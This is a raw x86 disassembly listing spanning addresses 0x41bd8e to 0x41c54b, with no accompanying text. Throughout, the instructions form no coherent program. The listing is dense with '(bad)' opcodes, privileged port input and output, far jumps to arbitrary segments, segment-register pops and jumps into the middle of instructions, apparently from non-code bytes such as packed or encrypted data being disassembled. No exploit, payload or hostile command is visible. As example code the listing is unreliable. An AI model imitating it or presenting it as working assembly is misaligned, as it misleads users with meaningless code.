  41bd8e:	xchg   DWORD PTR [edi+0x5b],esp
  41bd91:	mov    ds:0xeaf7685a,eax
  41bd96:	fcmovb st,st(4)
  41bd98:	test   BYTE PTR [eax],cl
  41bd9a:	loope  0x41bdf7
  41bd9c:	add    esp,eax
  41bd9e:	or     edi,edi
  41bda0:	jge    0x41bd31
  41bda2:	mov    al,BYTE PTR [esp+edi*2]
  41bda5:	pop    ds
  41bda6:	mov    edi,0x7ff63329
  41bdab:	test   DWORD PTR [ecx+0x2d],0xda81a73e
  41bdb2:	mov    bl,0xb6
  41bdb4:	loopne 0x41bdc3
  41bdb6:	jae    0x41bdaa
  41bdb8:	dec    ecx
  41bdb9:	add    eax,0x7b6ad20d
  41bdbe:	add    DWORD PTR [ebp-0x1b981fdd],0xfa056ddf
  41bdc8:	bound  eax,QWORD PTR [ebx+0x47]
  41bdcb:	daa    
  41bdcc:	push   0xffffffad
  41bdce:	or     bl,BYTE PTR [esi]
  41bdd0:	fidiv  DWORD PTR [ebp+ecx*1-0x2793d8e6]
  41bdd7:	outs   dx,DWORD PTR ds:[esi]
  41bdd8:	pop    ss
  41bdd9:	pop    es
  41bdda:	ficom  WORD PTR [ebp-0x53]
  41bdde:	daa    
  41bddf:	or     eax,DWORD PTR [edi+0x290b0cb9]
  41bde5:	jne    0x41be05
  41bde7:	into   
  41bde8:	popa   
  41bde9:	(bad)  
  41bdea:	(bad)  
  41bdec:	and    al,0xf
  41bdee:	jne    0x41be0f
  41bdf0:	dec    ecx
  41bdf1:	adc    al,0xeb
  41bdf3:	cmp    DWORD PTR [eax+0x1fbe04c8],ecx
  41bdf9:	pop    ebx
  41bdfa:	fwait
  41bdfb:	jnp    0x41be6b
  41bdfd:	adc    BYTE PTR [eax],ah
  41bdff:	push   es
  41be00:	and    edx,ebp
  41be02:	add    BYTE PTR [ebp-0x15a24492],cl
  41be08:	dec    esp
  41be09:	adc    eax,DWORD PTR [ebx]
  41be0b:	mov    bh,0xc6
  41be0d:	pop    es
  41be0e:	out    0x80,eax
  41be10:	aas    
  41be11:	jecxz  0x41be0a
  41be13:	mov    ebx,0x6e19b0ac
  41be18:	ficomp WORD PTR [edi]
  41be1a:	jmp    0x41be56
  41be1c:	fisttp DWORD PTR [eax-0x1d5b18f3]
  41be22:	ret    
  41be23:	adc    eax,0xc7082c22
  41be28:	and    BYTE PTR [eax],bl
  41be2a:	inc    ecx
  41be2b:	push   0xfffffff4
  41be2d:	shr    DWORD PTR [ebx],1
  41be2f:	js     0x41be12
  41be31:	push   ss
  41be32:	inc    ebx
  41be33:	pop    es
  41be34:	pop    ss
  41be35:	fstcw  WORD PTR [eax-0x65]
  41be39:	fnclex 
  41be3b:	cld    
  41be3c:	or     eax,0x417d80ef
  41be41:	ins    BYTE PTR es:[edi],dx
  41be42:	fldz   
  41be44:	shl    DWORD PTR [eax-0x45],cl
  41be47:	mov    bh,BYTE PTR [esi]
  41be49:	cmp    bh,0x2b
  41be4c:	cli    
  41be4d:	mov    esi,0x4d66b50
  41be52:	jl     0x41be55
  41be54:	inc    esi
  41be55:	mov    ecx,esi
  41be57:	adc    eax,esi
  41be59:	inc    edx
  41be5a:	in     al,dx
  41be5b:	lods   eax,DWORD PTR ds:[esi]
  41be5c:	mov    ds:0x75303a2a,eax
  41be61:	or     BYTE PTR [esi+0xe],al
  41be64:	push   ds
  41be65:	pop    ss
  41be66:	mov    edx,0xf139fb50
  41be6b:	je     0x41bebc
  41be6d:	adc    dl,BYTE PTR [esi]
  41be6f:	cmp    al,0x45
  41be71:	mov    eax,ds:0x5dab5246
  41be76:	mov    cl,0x7f
  41be78:	adc    al,0xe2
  41be7a:	pop    eax
  41be7b:	add    edx,eax
  41be7d:	aas    
  41be7e:	dec    esp
  41be7f:	jne    0x41beb4
  41be81:	pop    ss
  41be82:	or     al,0x53
  41be84:	sub    eax,0x2282cf57
  41be89:	sub    esp,edx
  41be8b:	(bad)  
  41be8c:	div    BYTE PTR [edi-0x1f26fdaf]
  41be92:	sbb    BYTE PTR [eax+0x523fdf04],cl
  41be98:	in     eax,dx
  41be99:	inc    edx
  41be9a:	pop    esp
  41be9b:	pushf  
  41be9c:	fstp   TBYTE PTR [edi]
  41be9e:	jle    0x41bf06
  41bea0:	test   eax,0x9afbc2eb
  41bea5:	and    esp,edx
  41bea7:	mov    al,0x1
  41bea9:	inc    edx
  41beaa:	ret    0x6d8b
  41bead:	xchg   ecx,eax
  41beae:	pop    edi
  41beaf:	stos   DWORD PTR es:[edi],eax
  41beb0:	std    
  41beb1:	jne    0x41be9e
  41beb3:	push   esi
  41beb4:	data16 add al,0x3c
  41beb7:	and    dh,bl
  41beb9:	ret    0xacd8
  41bebc:	mov    bh,0x6
  41bebe:	push   ds
  41bebf:	jmp    FWORD PTR [edx+edi*1]
  41bec2:	add    al,0xa
  41bec4:	jae    0x41bed5
  41bec6:	fimul  DWORD PTR ds:0x2dab153
  41becc:	inc    edx
  41becd:	jmp    0x41bf45
  41becf:	mov    esi,0x1beab3c6
  41bed4:	mov    cl,BYTE PTR [esi]
  41bed6:	sti    
  41bed7:	scas   eax,DWORD PTR es:[edi]
  41bed8:	stc    
  41bed9:	xchg   ebx,eax
  41beda:	in     eax,dx
  41bedb:	jp     0x41bed8
  41bedd:	mov    cl,0x29
  41bedf:	push   cs
  41bee0:	inc    esi
  41bee1:	imul   edx,edx,0xa
  41bee4:	pop    DWORD PTR [ecx+0x72c8f4fa]
  41beea:	jmp    0x21b:0xf6841467
  41bef1:	mov    ah,0x15
  41bef3:	test   eax,0x4f80d8a
  41bef9:	cmp    DWORD PTR [edx+0xf],ebp
  41befc:	ficom  WORD PTR [ebp+0x0]
  41beff:	adc    esp,DWORD PTR [edi+0x4ac09a36]
  41bf05:	ret    0x752
  41bf08:	daa    
  41bf09:	pop    eax
  41bf0a:	(bad)  
  41bf0b:	push   ebp
  41bf0c:	aas    
  41bf0d:	mov    ebx,DWORD PTR [ebx+0x6f]
  41bf10:	enter  0x2643,0x5b
  41bf14:	das    
  41bf15:	add    BYTE PTR [ecx+0x14560801],dh
  41bf1b:	push   ss
  41bf1c:	jb     0x41bf55
  41bf1e:	or     BYTE PTR [esp+ebp*8+0x4],dh
  41bf22:	add    dl,dh
  41bf24:	pop    ecx
  41bf25:	jo     0x41bf2b
  41bf27:	iret   
  41bf28:	sbb    BYTE PTR [eax+ebx*4],0x21
  41bf2c:	mov    ds,WORD PTR [esi]
  41bf2e:	aam    0x80
  41bf30:	ins    DWORD PTR es:[edi],dx
  41bf31:	mov    edi,0x2cdb2321
  41bf36:	and    al,0xdd
  41bf38:	push   ds
  41bf39:	fwait
  41bf3a:	and    BYTE PTR [ebx+ebp*1],cl
  41bf3d:	pushf  
  41bf3e:	mov    al,0x84
  41bf40:	pop    esp
  41bf41:	fnstenv [ebx-0x4f]
  41bf44:	add    DWORD PTR [ebx-0x5c697c40],esp
  41bf4a:	add    ecx,esp
  41bf4c:	lock xchg dh,dl
  41bf4f:	pusha  
  41bf50:	frstor [eax-0x7c8fbedf]
  41bf56:	in     al,dx
  41bf57:	or     ch,bl
  41bf59:	inc    ecx
  41bf5a:	cmp    bh,BYTE PTR [esi+0x589b24b9]
  41bf60:	pop    edx
  41bf61:	jmp    0x41bf74
  41bf63:	div    DWORD PTR [ebx-0x60b48be7]
  41bf69:	xchg   ebp,eax
  41bf6a:	push   0x509600a
  41bf6f:	pop    edx
  41bf70:	xchg   ebp,eax
  41bf71:	sub    BYTE PTR [ecx-0x5d72bf94],cl
  41bf77:	adc    DWORD PTR [edx-0x15],ecx
  41bf7a:	or     BYTE PTR [esi+eax*4],dl
  41bf7d:	call   0xe64eb31c
  41bf82:	pop    eax
  41bf83:	xchg   esi,eax
  41bf84:	outs   dx,DWORD PTR ds:[esi]
  41bf85:	das    
  41bf86:	(bad)  
  41bf87:	sbb    BYTE PTR [ebx+0x4d],dh
  41bf8a:	add    eax,0x47733cfa
  41bf8f:	stc    
  41bf90:	inc    ecx
  41bf91:	ss mov eax,0x4fee8054
  41bf97:	jae    0x41bfd3
  41bf99:	hlt    
  41bf9a:	rol    BYTE PTR [esi-0xb],0xdb
  41bf9e:	mov    bh,0x33
  41bfa0:	sub    dh,0x36
  41bfa3:	add    BYTE PTR [eax],cl
  41bfa5:	shr    BYTE PTR [ecx-0x2e],cl
  41bfa8:	pusha  
  41bfa9:	jmp    0xc2db:0x2e4d456f
  41bfb0:	or     dl,cl
  41bfb2:	call   0xae04f4ba
  41bfb7:	stos   DWORD PTR es:[edi],eax
  41bfb8:	push   ecx
  41bfb9:	dec    edx
  41bfba:	fild   DWORD PTR [edx]
  41bfbc:	fdiv   DWORD PTR ds:0x8d8a999
  41bfc2:	inc    edi
  41bfc3:	mov    esp,0x9b18dd92
  41bfc8:	sbb    edx,DWORD PTR [ebx]
  41bfca:	pop    esi
  41bfcb:	push   0x162f5dc6
  41bfd0:	mov    ecx,ebx
  41bfd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfd3:	dec    esp
  41bfd4:	mov    bh,0x6c
  41bfd6:	aaa    
  41bfd7:	rcl    DWORD PTR [eax+0x75ff2241],0x10
  41bfde:	add    cl,BYTE PTR [esi+esi*8]
  41bfe1:	fwait
  41bfe2:	mov    edx,0x72da3412
  41bfe7:	xlat   BYTE PTR ds:[ebx]
  41bfe8:	hlt    
  41bfe9:	lea    ecx,[ebp-0x2]
  41bfec:	mov    dx,0x6763
  41bff0:	bound  ebp,QWORD PTR [ebx-0x80]
  41bff3:	add    ah,BYTE PTR [ecx+ebx*4-0x35]
  41bff7:	jo     0x41c008
  41bff9:	ror    BYTE PTR [ebp+0x3c6445],cl
  41bfff:	jnp    0x41bfd0
  41c001:	adc    bh,ah
  41c003:	jae    0x42aa44e
  41c009:	pop    edx
  41c00a:	or     al,0x2b
  41c00c:	enter  0xdb61,0x82
  41c010:	outs   dx,DWORD PTR ds:[esi]
  41c011:	sbb    ecx,eax
  41c013:	and    eax,0x3
  41c016:	int3   
  41c017:	and    DWORD PTR [ecx],ecx
  41c019:	fnstenv [esi]
  41c01b:	mov    bh,0xdf
  41c01d:	loop   0x41c08a
  41c01f:	mov    esi,0xf64e3310
  41c024:	test   edx,edx
  41c026:	jne    0x41c03c
  41c028:	push   cs
  41c029:	mov    ecx,0xa0b44190
  41c02e:	xchg   ecx,eax
  41c02f:	add    ecx,esi
  41c031:	sahf   
  41c032:	add    eax,0x4f212cb1
  41c037:	xchg   edi,eax
  41c038:	fisttp WORD PTR [esi+0xc52e1d0]
  41c03e:	add    esi,DWORD PTR [ebx+0x18]
  41c041:	dec    esi
  41c042:	jg     0x41bfd1
  41c044:	add    al,0x40
  41c046:	add    eax,0x26c50b7
  41c04b:	lds    esi,FWORD PTR [esi-0x2c]
  41c04e:	jecxz  0x41c067
  41c050:	js     0x41c05d
  41c052:	cmp    ebx,0xfffffffe
  41c055:	add    DWORD PTR [edi],ecx
  41c057:	or     BYTE PTR [esi+0xf251b57],0x87
  41c05e:	xor    DWORD PTR [esi-0x375c2445],0xffffffe9
  41c065:	jb     0x41c0e4
  41c067:	add    eax,0xb77770c
  41c06c:	sti    
  41c06d:	mov    edi,0x715b6223
  41c072:	jle    0x41c03b
  41c074:	inc    eax
  41c075:	cmp    ebx,DWORD PTR [edx+eax*2-0x2]
  41c079:	ja     0x41c0df
  41c07b:	and    dh,BYTE PTR [ecx+0x480c7500]
  41c081:	aaa    
  41c082:	adc    DWORD PTR [edi-0xa],edi
  41c085:	lods   eax,DWORD PTR ds:[esi]
  41c086:	sar    edi,0x16
  41c089:	add    ebx,DWORD PTR [edx+ecx*2-0x2]
  41c08d:	inc    ecx
  41c08e:	dec    eax
  41c08f:	push   0x8b49ce18
  41c094:	shl    DWORD PTR [ebp+0x3f82ea20],0x99
  41c09b:	idiv   esi
  41c09d:	imul   esi,ecx,0xddd17f6d
  41c0a3:	mov    ebp,0x3d6c9f6
  41c0a8:	repnz sub esi,eax
  41c0ab:	pop    ds
  41c0ac:	mov    dh,0x1f
  41c0ae:	stc    
  41c0af:	add    esi,eax
  41c0b1:	test   DWORD PTR [esi],edx
  41c0b3:	loope  0x41c06b
  41c0b5:	das    
  41c0b6:	ret    
  41c0b7:	add    al,0x81
  41c0b9:	out    dx,al
  41c0ba:	ret    
  41c0bb:	cmp    eax,0x2545966e
  41c0c0:	test   ah,dh
  41c0c2:	push   0x792d16ef
  41c0c7:	and    bh,0xe4
  41c0ca:	ret    0x3d4b
  41c0cd:	cmp    DWORD PTR [eax+ebp*2+0x61e84de4],eax
  41c0d4:	jg     0x41c0a2
  41c0d6:	mov    ebp,0x499f4686
  41c0db:	(bad)  
  41c0dc:	xchg   ebp,eax
  41c0dd:	fld    DWORD PTR [edi]
  41c0df:	push   es
  41c0e0:	push   cs
  41c0e1:	pop    ebx
  41c0e2:	in     al,0xf4
  41c0e4:	add    al,0x3
  41c0e6:	sub    dh,BYTE PTR [edi-0x22d8af46]
  41c0ec:	jne    0x41c157
  41c0ee:	mov    eax,ds:0x49034207
  41c0f3:	mov    sp,0xf42f
  41c0f7:	or     eax,0xb1f981a7
  41c0fc:	cmp    dh,BYTE PTR ds:0xe981137c
  41c102:	pop    es
  41c103:	shl    dh,1
  41c105:	lods   al,BYTE PTR ds:[esi]
  41c106:	sub    eax,0x12a2c309
  41c10b:	jge    0x41c0fa
  41c10d:	pusha  
  41c10e:	repnz add BYTE PTR [ebx],ah
  41c111:	mov    esp,0x9ff02fd0
  41c116:	lods   al,BYTE PTR ds:[esi]
  41c117:	mov    ss,WORD PTR [ecx-0x49489960]
  41c11d:	mov    ebp,0x4f04c7b5
  41c122:	dec    WORD PTR [ebp+0x14]
  41c126:	sbb    DWORD PTR [esi+edx*1],0x2d0d6b66
  41c12d:	jbe    0x41c19a
  41c12f:	push   ds
  41c130:	adc    eax,0x1429d803
  41c135:	int    0xf2
  41c137:	not    BYTE PTR [esi]
  41c139:	int3   
  41c13a:	cs mov ch,0x5
  41c13d:	sub    al,0xfe
  41c13f:	shl    eax,0x2
  41c142:	sbb    eax,0x4615806d
  41c147:	sbb    BYTE PTR [edx+0x15],cl
  41c14a:	adc    BYTE PTR [esi+0x5d276c17],al
  41c150:	pushf  
  41c151:	test   al,0x80
  41c153:	and    eax,DWORD PTR [ecx-0x28]
  41c156:	adc    cl,BYTE PTR [edx+0x66ecabc2]
  41c15c:	in     eax,dx
  41c15d:	int    0xd5
  41c15f:	push   esi
  41c160:	fdivr  QWORD PTR [edi]
  41c162:	enter  0x5690,0x4c
  41c166:	dec    esi
  41c167:	(bad)  
  41c168:	mov    esp,0x735b6ee6
  41c16d:	test   DWORD PTR ss:[esi+0x3b],0x90b7207
  41c175:	or     eax,0xcbd05f54
  41c17a:	sub    DWORD PTR [eax-0x15],eax
  41c17d:	fsubr  QWORD PTR [ecx+0x19]
  41c180:	pop    ebx
  41c181:	imul   eax,DWORD PTR [esi-0x7f1a4f96],0x12
  41c188:	or     dh,ah
  41c18a:	pop    esp
  41c18b:	xchg   esi,eax
  41c18c:	and    DWORD PTR [edx],esi
  41c18e:	sub    edx,DWORD PTR ss:[ecx+0x51]
  41c192:	push   edi
  41c193:	xor    ebp,DWORD PTR [esi+ebx*2-0x10]
  41c197:	aas    
  41c198:	add    ah,BYTE PTR [esi]
  41c19a:	(bad)  
  41c19b:	push   ecx
  41c19c:	mov    WORD PTR [ebp+0x5edefe22],fs
  41c1a2:	fcmovb st,st(1)
  41c1a4:	cmp    BYTE PTR [eax+ecx*2],ch
  41c1a7:	mov    ebx,DWORD PTR [esi]
  41c1a9:	clc    
  41c1aa:	retf   0xd268
  41c1ad:	jbe    0x41c171
  41c1af:	cld    
  41c1b0:	mov    ecx,0x4049f937
  41c1b5:	add    al,0xa0
  41c1b7:	inc    edx
  41c1b8:	add    edx,DWORD PTR ds:0x324bb514
  41c1be:	xor    eax,0x848fa434
  41c1c3:	adc    bh,al
  41c1c5:	dec    ebp
  41c1c6:	mov    ebx,0x47750340
  41c1cb:	mov    esi,0xfafc992b
  41c1d0:	rol    DWORD PTR [eax],cl
  41c1d2:	rcl    ebp,1
  41c1d4:	push   ss
  41c1d5:	inc    esp
  41c1d6:	fiadd  DWORD PTR [edx+0x1a]
  41c1d9:	in     al,0x88
  41c1db:	mov    ebx,0x1292bcd7
  41c1e0:	and    BYTE PTR [ebp-0x1740ee6c],cl
  41c1e6:	sti    
  41c1e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1e8:	stos   BYTE PTR es:[edi],al
  41c1e9:	adc    DWORD PTR [esi],edi
  41c1eb:	or     BYTE PTR [ecx],al
  41c1ed:	cwde   
  41c1ee:	sbb    DWORD PTR [ebx+0x4],ebx
  41c1f1:	popf   
  41c1f2:	pop    esp
  41c1f3:	adc    ebp,DWORD PTR [edi-0x38]
  41c1f6:	sbb    eax,0x86c7b0c5
  41c1fb:	(bad)  [eax]
  41c1fd:	jne    0x41c1cf
  41c1ff:	pop    ecx
  41c200:	pop    ds
  41c201:	arpl   bx,sp
  41c203:	aaa    
  41c204:	retf   
  41c205:	pop    ebx
  41c206:	dec    ebp
  41c207:	and    eax,0xe03f046a
  41c20c:	fimul  DWORD PTR ss:[ebp+ebp*8+0x6a]
  41c211:	in     al,0x80
  41c213:	call   0xe0f4d9de
  41c218:	mov    al,ds:0xb92dae86
  41c21d:	mov    ecx,0xbabb7821
  41c222:	xor    BYTE PTR [ebx+0x4d],dh
  41c225:	int    0xdb
  41c227:	fcmovbe st,st(0)
  41c229:	push   cs
  41c22a:	inc    edi
  41c22b:	jno    0x41c1b7
  41c22d:	push   es
  41c22e:	mov    ecx,DWORD PTR [ebx]
  41c230:	scas   eax,DWORD PTR es:[edi]
  41c231:	push   ecx
  41c232:	pop    esp
  41c233:	aaa    
  41c234:	adc    eax,0x1054b570
  41c239:	xor    cl,0x2b
  41c23c:	adc    BYTE PTR [edx-0x4ba244ee],cl
  41c242:	ja     0x41c1e5
  41c244:	cmp    dl,BYTE PTR [ecx-0x5]
  41c247:	je     0x41c2a9
  41c249:	dec    esp
  41c24a:	cld    
  41c24b:	inc    eax
  41c24c:	mov    eax,0x776d4289
  41c251:	shl    DWORD PTR [eax-0x7fd1f40c],0x78
  41c258:	in     eax,dx
  41c259:	inc    ebp
  41c25a:	sub    bl,BYTE PTR [ecx]
  41c25c:	fimul  DWORD PTR [ebp+0x70893f07]
  41c262:	or     al,0x2
  41c264:	pop    ds
  41c265:	fnsave [edi]
  41c267:	idiv   BYTE PTR [ebx+0x5ee48d2]
  41c26d:	push   eax
  41c26e:	lock dec edi
  41c270:	repnz push 0x24c60a74
  41c276:	retf   
  41c277:	popa   
  41c278:	in     eax,dx
  41c279:	inc    eax
  41c27a:	in     eax,dx
  41c27b:	add    DWORD PTR [ecx],edi
  41c27d:	aaa    
  41c27e:	jecxz  0x41c2b1
  41c280:	enter  0xd8c8,0x2d
  41c284:	sub    esp,esp
  41c286:	push   eax
  41c287:	ds out 0xe8,al
  41c28a:	sbb    ch,dl
  41c28c:	xchg   ecx,eax
  41c28d:	int    0xea
  41c28f:	jb     0x41c24d
  41c291:	jecxz  0x41c294
  41c293:	lahf   
  41c294:	ficom  WORD PTR [edx-0x70]
  41c297:	cmp    esp,esp
  41c299:	(bad)  
  41c29a:	xor    al,0x8d
  41c29c:	or     DWORD PTR [esi-0x7f],edx
  41c29f:	and    esi,DWORD PTR [esi]
  41c2a1:	add    ah,bh
  41c2a3:	into   
  41c2a4:	(bad)  
  41c2a5:	jo     0x41c2ba
  41c2a7:	bound  esi,QWORD PTR [edx]
  41c2a9:	js     0x41c2e3
  41c2ab:	cmp    BYTE PTR [ecx],bh
  41c2ad:	sub    eax,DWORD PTR [ebp-0x27]
  41c2b0:	sbb    al,0x40
  41c2b2:	lahf   
  41c2b3:	or     dh,al
  41c2b5:	inc    esp
  41c2b6:	scas   al,BYTE PTR es:[edi]
  41c2b7:	out    0xa4,al
  41c2b9:	jmp    0xad54:0x3caceeee
  41c2c0:	mov    ecx,0xc894783e
  41c2c5:	aas    
  41c2c6:	pop    ss
  41c2c7:	call   0xa8c5f49c
  41c2cc:	(bad)
  41c2cf:	mov    bl,BYTE PTR [esi-0x20a63e1e]
  41c2d5:	cmp    ch,dh
  41c2d7:	fadd   DWORD PTR [esi+0x2cea70b7]
  41c2dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2de:	push   ebp
  41c2df:	aaa    
  41c2e0:	xchg   ebp,eax
  41c2e1:	sub    ah,BYTE PTR [eax+0x5c]
  41c2e4:	shl    BYTE PTR [edi+0x41],0x1d
  41c2e8:	dec    esi
  41c2e9:	jne    0xa8453977
  41c2ef:	add    esp,0x3c
  41c2f2:	mov    esi,DWORD PTR [edx+eiz*1+0x4]
  41c2f6:	adc    DWORD PTR [eax-0x58],edx
  41c2f9:	lock or eax,0x51c37d75
  41c2ff:	call   0x2e0789b
  41c304:	popf   
  41c305:	cmp    ch,cl
  41c307:	or     eax,0x60eb1432
  41c30c:	test   BYTE PTR [esi+0x57af0ec4],dh
  41c312:	inc    eax
  41c313:	jle    0x41c36c
  41c315:	push   ss
  41c316:	loop   0x41c2f5
  41c318:	and    eax,0x9b0837e8
  41c31d:	rol    BYTE PTR [ebp+0x75],0x42
  41c321:	sub    eax,DWORD PTR [ebx]
  41c323:	xlat   BYTE PTR ds:[ebx]
  41c324:	add    dh,BYTE PTR [ebx+0x6cd49c27]
  41c32a:	xchg   edx,eax
  41c32b:	dec    eax
  41c32c:	scas   eax,DWORD PTR es:[edi]
  41c32d:	pop    edi
  41c32e:	nop
  41c32f:	jmp    0x41c366
  41c331:	mov    ds:0x8bd974f8,eax
  41c336:	ja     0x41c310
  41c338:	or     DWORD PTR [edx+0xd],esp
  41c33b:	or     BYTE PTR [ebx-0x3d],ah
  41c33e:	sbb    edi,DWORD PTR [ebx+0x59]
  41c341:	les    eax,FWORD PTR [ebx-0x7b874f19]
  41c347:	or     esp,DWORD PTR ss:[ebx]
  41c34a:	mov    dh,BYTE PTR [eax]
  41c34c:	sbb    BYTE PTR [ebp-0x13],ah
  41c34f:	and    al,0xd0
  41c351:	mov    ebp,fs
  41c353:	or     BYTE PTR [ebx+0x67],cl
  41c356:	add    eax,DWORD PTR [bp+di]
  41c359:	popa   
  41c35a:	enter  0x6b08,0xec
  41c35e:	gs leave 
  41c360:	and    eax,0x7679c843
  41c365:	in     al,dx
  41c366:	out    dx,al
  41c367:	repnz test BYTE PTR [ebx+0x74],cl
  41c36b:	repnz inc edx
  41c36d:	jg     0x41c37e
  41c36f:	push   0x79
  41c371:	mov    WORD PTR [edx+0x20],?
  41c374:	dec    edi
  41c375:	cmp    bl,ch
  41c377:	or     eax,0xec987979
  41c37c:	jns    0x41c3f6
  41c37e:	and    al,0x43
  41c380:	in     al,dx
  41c381:	je     0x41c3b6
  41c383:	jne    0x41c371
  41c385:	cld    
  41c386:	test   DWORD PTR [edx+0xb],eax
  41c389:	xchg   esp,eax
  41c38a:	daa    
  41c38b:	cmp    BYTE PTR [eax],0x30
  41c38e:	jne    0x41c3a7
  41c390:	push   ebx
  41c391:	xor    BYTE PTR [ecx+eiz*8+0x49c84421],ah
  41c398:	add    cl,BYTE PTR gs:[ebp-0x7a]
  41c39c:	in     al,dx
  41c39d:	add    BYTE PTR [ebx],0x79
  41c3a0:	jge    0x41c39a
  41c3a2:	lock mov esi,0xf793d8c8
  41c3a8:	jns    0x41c423
  41c3aa:	add    BYTE PTR [ebx],cl
  41c3ac:	add    al,0xd
  41c3ae:	add    BYTE PTR [ebp+0x44],dh
  41c3b1:	out    0xc,al
  41c3b3:	inc    edi
  41c3b4:	aam    0x31
  41c3b6:	aam    0x27
  41c3b8:	push   ecx
  41c3b9:	pop    ebp
  41c3ba:	mov    ah,0x2
  41c3bc:	fdivr  st,st(7)
  41c3be:	jne    0x41c361
  41c3c0:	or     edx,0x4691530d
  41c3c6:	lahf   
  41c3c7:	push   ss
  41c3c8:	pop    ebp
  41c3c9:	pop    es
  41c3ca:	mov    bl,0xad
  41c3cc:	cmp    DWORD PTR [esi],0xffffffb6
  41c3cf:	mov    eax,0x4df10282
  41c3d4:	mulps  xmm5,XMMWORD PTR [esi-0x69]
  41c3d8:	into   
  41c3d9:	inc    DWORD PTR [eax+0x320e292]
  41c3df:	in     eax,dx
  41c3e0:	add    bl,ah
  41c3e2:	sub    eax,0xe1aa7c00
  41c3e7:	mov    esp,0x841381
  41c3ec:	sqrtps xmm0,XMMWORD PTR [ecx]
  41c3ef:	or     al,0xde
  41c3f1:	adc    DWORD PTR [edi+ecx*1],edi
  41c3f4:	sbb    BYTE PTR [ecx+0x5a3d354],ch
  41c3fa:	scas   al,BYTE PTR es:[edi]
  41c3fb:	add    al,0x49
  41c3fd:	cmc    
  41c3fe:	push   es
  41c3ff:	ds fwait
  41c401:	aam    0xec
  41c403:	adc    bl,BYTE PTR [ebp+0x10ad0698]
  41c409:	mov    eax,0x3c120689
  41c40e:	ins    BYTE PTR es:[edi],dx
  41c40f:	test   BYTE PTR [edx+0x3e],0x11
  41c413:	mov    bl,BYTE PTR [ebp-0x16]
  41c416:	cwde   
  41c417:	into   
  41c418:	add    ah,bh
  41c41a:	add    al,0x9f
  41c41c:	sub    al,0x1a
  41c41e:	jae    0x41c3a6
  41c420:	or     bh,BYTE PTR [edi+0x6d6f8a8]
  41c426:	mov    ds:0x7d80ba4d,eax
  41c42b:	loop   0x41c475
  41c42d:	(bad)  
  41c42e:	dec    eax
  41c42f:	inc    eax
  41c430:	pop    edi
  41c431:	or     DWORD PTR [esi-0x78],0x5d
  41c435:	loop   0x41c474
  41c437:	ficomp WORD PTR [ebx+0x8]
  41c43a:	inc    edi
  41c43b:	lods   eax,DWORD PTR ds:[esi]
  41c43c:	sar    DWORD PTR [eax],0xe2
  41c43f:	cmp    dh,BYTE PTR [edi-0x20479422]
  41c445:	fidivr DWORD PTR [edx-0x79]
  41c448:	jmp    DWORD PTR [eax*4+0x4ebd506]
  41c44f:	jecxz  0x41c4b8
  41c451:	xchg   ebx,eax
  41c452:	cld    
  41c453:	add    BYTE PTR ds:0xb060e00,cl
  41c459:	add    BYTE PTR [eax*1+0x47c05e8c],cl
  41c460:	jno    0x41c464
  41c462:	push   es
  41c463:	mov    eax,DWORD PTR [edi]
  41c465:	mov    dh,0x73
  41c467:	mov    ecx,0xaefa8f6d
  41c46c:	or     al,BYTE PTR [ebx]
  41c46e:	add    DWORD PTR ds:0xb9a5007b,0x7c4f4d34
  41c478:	test   eax,0xa5bb0e7c
  41c47d:	imul   ebp,DWORD PTR [esi],0xffce7dcd
  41c483:	jle    0x41c4b5
  41c485:	gs xchg esi,eax
  41c487:	mov    ebx,0x80cd34db
  41c48c:	(bad)  
  41c48e:	xchg   ebx,eax
  41c48f:	mov    dl,0x55
  41c491:	ret    
  41c492:	jbe    0x41c414
  41c494:	pop    ecx
  41c495:	push   es
  41c496:	outs   dx,DWORD PTR ds:[esi]
  41c497:	mov    ds:0x59b01d41,eax
  41c49c:	mov    esp,0x2ff232c
  41c4a1:	add    esp,0x7
  41c4a4:	and    eax,0x6df1ecb9
  41c4a9:	or     ebp,0x3e
  41c4ac:	test   al,dl
  41c4ae:	jbe    0x41c4e4
  41c4b0:	pop    ecx
  41c4b1:	sti    
  41c4b2:	and    bh,BYTE PTR [edx-0x4f49e904]
  41c4b8:	add    al,0x17
  41c4ba:	dec    esi
  41c4bb:	and    eax,0xd9af8d55
  41c4c0:	cdq    
  41c4c1:	sub    BYTE PTR [ebx+0x28771003],dh
  41c4c7:	fsubr  DWORD PTR [esp+esi*1]
  41c4ca:	dec    edi
  41c4cb:	push   es
  41c4cc:	xchg   edx,eax
  41c4cd:	adc    al,0xd4
  41c4cf:	js     0x41c465
  41c4d1:	aam    0x64
  41c4d3:	mov    bh,BYTE PTR [eax]
  41c4d5:	nop
  41c4d6:	hlt    
  41c4d7:	dec    eax
  41c4d8:	pop    eax
  41c4d9:	jbe    0x41c4fd
  41c4db:	call   0x8c30:0xeb18e7bd
  41c4e2:	mov    al,ds:0x51fbe4a2
  41c4e7:	push   edi
  41c4e8:	lock sbb edx,DWORD PTR [esi-0x64]
  41c4ec:	sbb    DWORD PTR [eax+ebx*1],edx
  41c4ef:	mov    dh,0xb2
  41c4f1:	add    ecx,esp
  41c4f3:	fs pop ebp
  41c4f5:	retf   
  41c4f6:	ficomp WORD PTR [esi+0x20]
  41c4f9:	icebp  
  41c4fa:	dec    eax
  41c4fb:	je     0x41c546
  41c4fd:	add    ch,BYTE PTR [ebp-0x15]
  41c500:	jg     0x41c4a6
  41c502:	or     DWORD PTR [eax-0x1195836b],edi
  41c508:	add    ecx,DWORD PTR [ebp-0x21]
  41c50b:	cdq    
  41c50c:	mov    eax,ds:0xdf942e8f
  41c511:	pop    ebp
  41c512:	cld    
  41c513:	es adc al,0x44
  41c516:	dec    eax
  41c517:	push   ds
  41c518:	and    eax,0xb931857
  41c51d:	fnstenv ds:0x79138472
  41c523:	pushf  
  41c524:	mov    BYTE PTR [ecx],al
  41c526:	ss dec esi
  41c528:	or     DWORD PTR [ecx],edx
  41c52a:	call   0xa2225b88
  41c52f:	push   ecx
  41c530:	mov    bl,ch
  41c532:	push   edx
  41c533:	sbb    eax,0x7d7d1bdc
  41c538:	xchg   BYTE PTR [esi-0x48],ah
  41c53b:	or     DWORD PTR [ebx+0x1210d5db],esp
  41c541:	scas   eax,DWORD PTR es:[edi]
  41c542:	dec    ebx
  41c543:	das    
  41c544:	(bad)  
  41c545:	retf   
  41c546:	and    cl,BYTE PTR [edi]
  41c548:	mov    dh,0x74
  41c54a:	dec    eax
  41c54b:	jg     0x41c564
